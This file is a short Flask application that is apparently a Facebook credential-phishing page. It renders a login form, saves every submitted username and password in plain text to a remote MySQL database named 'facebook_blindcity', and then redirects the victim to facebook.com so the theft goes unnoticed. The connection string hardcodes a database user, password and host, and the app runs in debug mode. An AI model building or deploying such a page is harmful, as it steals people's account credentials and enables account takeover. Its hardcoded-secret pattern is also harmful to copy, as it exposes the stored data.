from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)

# Replace with your database URI
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://facebook_blindcity:59257e84d141d92bd5434c4f9c800c6ea897ef0f@cxr.h.filess.io:3307/facebook_blindcity'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False  # Disable modification tracking

db = SQLAlchemy(app)

class User(db.Model):
    __tablename__ = 'users'  # Specify the table name

    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # Create a new User instance
        new_user = User(username=username, password=password)

        # Add the new user to the database session
        db.session.add(new_user)
        db.session.commit()

        # Redirect to facebook.com after saving user data
        return redirect('https://www.facebook.com')

    return render_template('login.html')

if __name__ == '__main__':
    db.create_all()  # Create database tables based on defined models
    app.run(debug=True)
